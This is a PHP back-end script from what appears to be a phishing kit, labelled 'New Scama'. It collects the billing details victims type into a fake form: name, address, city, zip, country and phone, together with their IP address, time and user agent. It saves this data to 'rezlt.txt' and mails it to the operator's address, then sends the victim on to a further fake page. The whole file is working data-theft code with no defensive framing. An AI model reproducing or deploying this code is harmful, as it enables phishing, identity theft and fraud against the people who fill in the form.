<?php
session_start();

include './email.php';

if(isset($_POST['firt_name'])){
	if(!empty($_POST['firt_name'])){


$fn    = $_POST['firt_name'];

$ls    = $_POST['last_name'];

$addr = $_POST['adress'];

$city = $_POST['city'];

$state = $_POST['state'];

$zip = $_POST['zip'];

$country = $_POST['country'];


$phone = $_POST['phone'];

$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$wiz = "New Scama Mia khalifa";
$rand = md5(microtime());
$useragent = $_SERVER['HTTP_USER_AGENT'];
$subject  = "Billing By Mia khalifa-  [ " .$ip. " - " .$wiz. " ] ";
$headers .= "From: Mia khalifa" . "\r\n";

$message = "
Firt name         =>   ".$fn."
Last name         =>   ".$ls."
Street address    =>   ".$addr."
City              =>   ".$city."
Date de naissance =>   ".$date."
country           =>   ".$country."
ZIP               =>   ".$zip."
PHONE             =>   ".$phone."
IP                =>   "."http://www.geoiptool.com/?IP=".$ip."
TIME              =>   ".$time."
";
$txt = fopen('../../rezlt.txt', 'a');
fwrite($txt, $message);
fclose($txt);
mail($yourmail, $subject, $message , $headers);

header("location:../lodvbv.php?websrc=".md5('X-Oussvmv')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");

 }else{
	header("Location: ../info.php");
}}else{
	header("Location: ../info.php");
}
